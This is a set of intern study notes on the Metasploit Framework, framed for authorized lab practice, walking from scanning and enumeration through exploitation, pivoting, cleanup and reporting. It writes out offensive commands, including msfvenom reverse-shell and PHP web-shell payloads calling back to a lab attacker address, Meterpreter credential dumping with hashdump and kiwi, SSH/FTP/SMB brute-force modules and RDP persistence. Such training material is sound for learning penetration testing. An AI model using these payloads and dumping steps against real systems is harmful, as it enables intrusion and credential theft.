# Metasploit Framework — Intern-Level Study Notes

*Scope: Cybersecurity / SOC / Junior Pentest Intern. Practice only in labs you own or are authorized to test (e.g., Metasploitable2, HackTheBox, TryHackMe, DVWA).*

---

## 1. Metasploit Framework Basics

- **What it is**: A framework for developing, testing, and executing exploit code against a target system, plus tools for scanning, enumeration, and post-exploitation.
- **Core components**:
  - **msfconsole** – main CLI interface (used 95% of the time)
  - **msfvenom** – payload generator
  - **msfdb** – database management
- **Module types**: exploit, auxiliary, post, payload, encoder, nop, evasion.
- **Starting up**:
  ```
  msfconsole
  ```
- **Essential console commands**:
  ```
  help / ?          # show help
  banner            # fun ascii banner
  version           # msf version
  use <module>      # load a module
  back              # unload current module
  info              # module details
  show options      # show module options
  show payloads     # show compatible payloads
  set <OPT> <val>   # set an option
  setg <OPT> <val>  # set option globally (persists across modules)
  unset / unsetg
  run / exploit     # execute module
  exit              # quit console
  ```

---

## 2. Workspaces

- Workspaces let you separate engagement data (hosts, services, loot, creds) by project/client.
- Commands:
  ```
  workspace                  # list workspaces
  workspace -a <name>        # add new workspace
  workspace <name>           # switch to workspace
  workspace -d <name>        # delete workspace
  workspace -r <old> <new>   # rename
  ```
- Good practice: create one workspace per target/engagement (e.g., `workspace -a intern_lab1`).

---

## 3. Database (PostgreSQL)

- Metasploit uses PostgreSQL to store hosts, services, vulns, loot, creds — enabling `search`, `hosts`, `services` commands to work fast.
- Setup / management:
  ```
  sudo systemctl start postgresql
  sudo msfdb init          # initialize DB (first time)
  sudo msfdb start
  sudo msfdb status
  ```
- Inside msfconsole, verify connection:
  ```
  db_status
  ```
- Useful DB commands:
  ```
  hosts                # list discovered hosts
  services              # list discovered services
  vulns                 # list found vulnerabilities
  db_nmap <target>      # run nmap and auto-store results in DB
  ```

---

## 4. Import Nmap Scan Results

- Run an Nmap scan separately and save in XML format:
  ```
  nmap -sV -oX scan.xml <target>
  ```
- Import into Metasploit DB:
  ```
  db_import scan.xml
  ```
- Verify import:
  ```
  hosts
  services
  ```
- Alternative — scan directly from msfconsole (auto-stored in DB):
  ```
  db_nmap -sV <target>
  ```

---

## 5. Search Modules

- Find modules by keyword, CVE, platform, type:
  ```
  search type:exploit platform:windows smb
  search cve:2017-0144
  search eternalblue
  search name:ms17_010
  ```
- After finding a module:
  ```
  use <module_path_or_number>
  info
  ```

---

## 6. Auxiliary Modules

- Non-exploit modules: scanning, fuzzing, DoS, sniffing, admin access.
- Located under `auxiliary/`.
- Example — SMB version scan:
  ```
  use auxiliary/scanner/smb/smb_version
  set RHOSTS <target/range>
  run
  ```
- Key point: auxiliary modules generally **don't** give a shell — they gather info or perform an action.

---

## 7. Scanner Modules

- Subtype of auxiliary modules (`auxiliary/scanner/...`) used for host/service discovery.
- Common examples:
  ```
  auxiliary/scanner/portscan/tcp
  auxiliary/scanner/smb/smb_version
  auxiliary/scanner/ftp/ftp_version
  auxiliary/scanner/ssh/ssh_version
  auxiliary/scanner/http/http_version
  ```
- Usage pattern:
  ```
  use auxiliary/scanner/portscan/tcp
  set RHOSTS 192.168.1.0/24
  set THREADS 20
  run
  ```

---

## 8. Enumeration Modules

- Used to gather deeper service/user/share info after scanning.
- Examples:
  ```
  auxiliary/scanner/smb/smb_enumshares
  auxiliary/scanner/smb/smb_enumusers
  auxiliary/scanner/ftp/anonymous
  auxiliary/scanner/snmp/snmp_enum
  ```
- Goal: identify usernames, shares, banners, misconfigurations, anonymous access.

---

## 9. Exploit Modules

- Modules under `exploit/` that actively attack a vulnerability to gain access.
- Workflow:
  ```
  search <vuln/cve>
  use exploit/<path>
  show options
  set RHOSTS <target>
  set RPORT <port>
  show targets        # if multiple OS/target versions supported
  set target <n>
  show payloads
  set payload <payload>
  set LHOST <attacker_ip>
  set LPORT <port>
  check               # (if supported) verify vulnerability without exploiting
  run / exploit
  ```

---

## 10. Payloads

- Code delivered/executed on the target after successful exploitation.
- Types:
  - **Singles** – self-contained (add user, execute command) — no separate connection stage.
  - **Stagers** – small, establish a connection, then pull the full payload.
  - **Stages** – downloaded by the stager (e.g., Meterpreter).
- Naming convention: `platform/arch/payload_name`
  ```
  windows/x64/meterpreter/reverse_tcp
  linux/x86/shell/reverse_tcp
  ```
- Reverse vs Bind:
  - **Reverse shell**: target connects back to attacker (bypasses inbound firewall rules) — most common.
  - **Bind shell**: target opens a port and waits for attacker to connect.

---

## 11. `msfvenom` Basics

- Standalone tool to generate and encode payloads (combines old msfpayload + msfencode).
- Basic syntax:
  ```
  msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outputfile>
  ```
- Examples:
  ```
  # Windows reverse Meterpreter EXE
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe

  # Linux ELF
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf

  # PHP web shell
  msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f raw -o shell.php
  ```
- Useful flags:
  ```
  -l          # list payloads/encoders/formats
  -f          # output format (exe, elf, raw, php, war, apk...)
  -e          # encoder (evasion, basic level)
  -a          # architecture
  --platform  # target platform
  ```

---

## 12. Multi/Handler

- Listener module that catches the reverse connection from a payload generated via msfvenom (or a standalone binary).
- Setup:
  ```
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST <attacker_ip>
  set LPORT <port>
  run
  ```
- Must **match** payload type/arch/LHOST/LPORT exactly to what was used in msfvenom.
- Can background with `run -j` or `exploit -j -z` to keep listening for multiple sessions.

---

## 13. Meterpreter Basics

- Advanced, stealthy, in-memory payload — the "shell" you'll use most.
- Core commands:
  ```
  sysinfo              # OS/hostname info
  getuid                # current user
  ps                    # list processes
  getpid                # current process ID
  pwd / cd / ls         # navigation
  screenshot             # capture screen
  webcam_list / webcam_snap
  shell                  # drop to native OS shell
  background (Ctrl+Z)    # background the session
  help                   # list meterpreter commands
  ```

---

## 14. Session Management

- Manage multiple active sessions across targets.
- Commands (run from msfconsole, not inside meterpreter):
  ```
  sessions -l           # list sessions
  sessions -i <id>      # interact with a session
  sessions -k <id>      # kill a session
  sessions -K           # kill all sessions
  sessions -u <id>      # upgrade shell to meterpreter
  ```
- Inside a session, `background` (or Ctrl+Z) returns to msfconsole without killing it.

---

## 15. File Upload & Download

- Inside a Meterpreter session:
  ```
  upload <local_path> <remote_path>
  download <remote_path> <local_path>
  ```
- Example:
  ```
  upload /home/kali/tools/linpeas.sh /tmp/linpeas.sh
  download /etc/passwd /home/kali/loot/passwd
  ```
- Check remote location first with `pwd`, `ls`, `cd`.

---

## 16. Basic Post-Exploitation

- Gathering info and consolidating access after initial compromise.
- Useful commands/modules:
  ```
  sysinfo
  getuid
  run post/multi/gather/env               # gather env variables (Linux/Windows)
  run post/windows/gather/checkvm         # check if target is a VM
  run post/windows/manage/enable_rdp      # enable RDP for persistence
  hashdump                                 # (Windows, needs SYSTEM) dump SAM hashes
  ```
- `post/` modules are run against an **existing session** using:
  ```
  use post/<module>
  set SESSION <id>
  run
  ```

---

## 17. Local Exploit Suggester

- Auxiliary/post module that checks a session against known local privilege escalation exploits.
- Usage:
  ```
  use post/multi/recon/local_exploit_suggester
  set SESSION <id>
  run
  ```
- Output lists exploits likely to work based on OS/patch level — then `use` the suggested exploit module directly.

---

## 18. Basic Privilege Escalation

- Goal: move from a low-privilege shell to admin/root/SYSTEM.
- Techniques at intern level:
  - Run **local_exploit_suggester** (see #17)
  - Manual enumeration scripts uploaded via Meterpreter:
    - Windows: `winPEAS`, `PowerUp.ps1`
    - Linux: `linPEAS`, `LinEnum.sh`
  - Meterpreter built-in:
    ```
    getsystem     # tries known Windows techniques automatically
    ```
  - Check for misconfigurations: weak service permissions, SUID binaries, writable cron jobs, unquoted service paths.

---

## 19. Credential Dumping (Basics)

- Extract stored password hashes/credentials from a compromised host (requires sufficient privileges, e.g. SYSTEM/root).
- Meterpreter:
  ```
  hashdump                        # dump Windows SAM hashes
  load kiwi                       # load Mimikatz-based extension (Windows only)
  creds_all                       # (kiwi) dump all credentials
  ```
- Linux equivalent: read `/etc/passwd` and `/etc/shadow` (needs root) or via post modules:
  ```
  run post/linux/gather/hashdump
  ```
- **Note**: Only for authorized lab/engagement use; handle dumped creds per engagement rules of engagement.

---

## 20. Password Attack Modules (SSH, FTP, SMB)

- Bruteforce/credential-testing auxiliary modules:
  ```
  use auxiliary/scanner/ssh/ssh_login
  set RHOSTS <target>
  set USERNAME <user>
  set PASS_FILE /path/to/wordlist.txt
  run
  ```
  ```
  use auxiliary/scanner/ftp/ftp_login
  set RHOSTS <target>
  set USER_FILE users.txt
  set PASS_FILE passwords.txt
  run
  ```
  ```
  use auxiliary/scanner/smb/smb_login
  set RHOSTS <target>
  set SMBUser administrator
  set PASS_FILE passwords.txt
  run
  ```
- Key options: `USERNAME`/`USER_FILE`, `PASSWORD`/`PASS_FILE`, `RHOSTS`, `STOP_ON_SUCCESS`, `THREADS`.

---

## 21. Loot & Credentials Management

- Metasploit auto-stores captured hashes/creds/files ("loot") in the database per workspace.
- Commands:
  ```
  loot                  # list collected loot (files, hashes, screenshots)
  creds                 # list captured credentials
  creds add user:... password:...    # manually add a credential
  ```
- Loot files are also saved locally, usually under `~/.msf4/loot/`.

---

## 22. Resource Scripts (`.rc`)

- `.rc` files automate a sequence of msfconsole commands — useful for repeatable setups (e.g., auto-configuring a handler).
- Example `handler.rc`:
  ```
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST 10.10.10.5
  set LPORT 4444
  exploit -j -z
  ```
- Run it:
  ```
  msfconsole -r handler.rc
  ```
  or from inside msfconsole:
  ```
  resource handler.rc
  ```
- Great for standardizing intern lab setups and saving time.

---

## 23. Basic Pivoting (`autoroute`)

- Pivoting = using a compromised host as a relay to reach an internal network not directly reachable from the attacker machine.
- Steps:
  1. Get a Meterpreter session on a dual-homed host (has access to internal subnet).
  2. Add a route through it:
     ```
     use post/multi/manage/autoroute
     set SESSION <id>
     set SUBNET 10.10.20.0
     set NETMASK 255.255.255.0
     run
     ```
     or directly in the session:
     ```
     run autoroute -s 10.10.20.0/24
     ```
  3. Now scan/exploit modules can target the internal subnet through that session.
  4. Optional: use `socks_proxy` module + proxychains for external tools (nmap, etc.) to route through the pivot.

---

## 24. Cleanup

- After any lab/engagement, remove your foothold and artifacts (professional standard, even in labs):
  - Kill sessions: `sessions -K`
  - Remove uploaded tools/payloads from target (`del`/`rm` via shell or meterpreter):
    ```
    rm /tmp/linpeas.sh
    ```
  - Remove any created accounts, scheduled tasks, or persistence mechanisms you added.
  - Clear meterpreter timestomp/logs only if explicitly authorized (be careful — in real engagements, evidence removal is governed by the rules of engagement; don't do this without permission).
  - Close/kill handler listeners: `jobs -K`

---

## 25. Reporting & Evidence Collection

- Documentation is as important as the technical work.
- What to capture throughout:
  - Screenshots (`screenshot` in meterpreter)
  - Commands run and their output
  - Timestamps of access
  - Loot/creds gathered (`loot`, `creds`)
  - Hosts/services/vulns from the DB:
    ```
    hosts -o hosts_report.csv
    services -o services_report.csv
    vulns -o vulns_report.csv
    ```
- Structure a basic report:
  1. Executive summary
  2. Scope & methodology
  3. Findings (vuln, affected host, severity, evidence)
  4. Steps to reproduce
  5. Remediation recommendations
  6. Appendix (raw scan/loot data)

---

## Quick Reference — Typical Intern Workflow

```
1. msfconsole
2. workspace -a client_lab
3. db_nmap -sV <target>            # or db_import scan.xml
4. hosts / services
5. search <service/CVE>
6. use auxiliary/scanner/...       # enumerate first
7. use exploit/...                 # then exploit
8. set payload ...; set LHOST/LPORT; run
9. sessions -l / sessions -i <id>
10. sysinfo, getuid, hashdump, loot
11. run post/multi/recon/local_exploit_suggester
12. getsystem / privesc exploit
13. download evidence, note findings
14. cleanup: sessions -K, remove artifacts
15. write report (hosts/services/vulns -o *.csv)
```

---

*Always operate within written authorization / scope of engagement. Unauthorized use of Metasploit against systems you don't own or have permission to test is illegal.*
